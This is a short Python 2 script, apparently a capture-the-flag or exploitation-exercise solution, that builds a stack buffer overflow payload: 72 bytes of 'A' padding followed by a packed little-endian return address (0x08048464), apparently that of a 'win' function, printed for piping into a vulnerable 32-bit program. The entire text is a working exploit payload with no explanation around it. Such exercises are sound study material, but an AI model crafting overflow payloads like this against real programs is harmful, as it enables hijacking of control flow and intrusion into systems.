import struct
win=struct.pack("<I", 0x08048464)
overflow="A"*72+win
print overflow
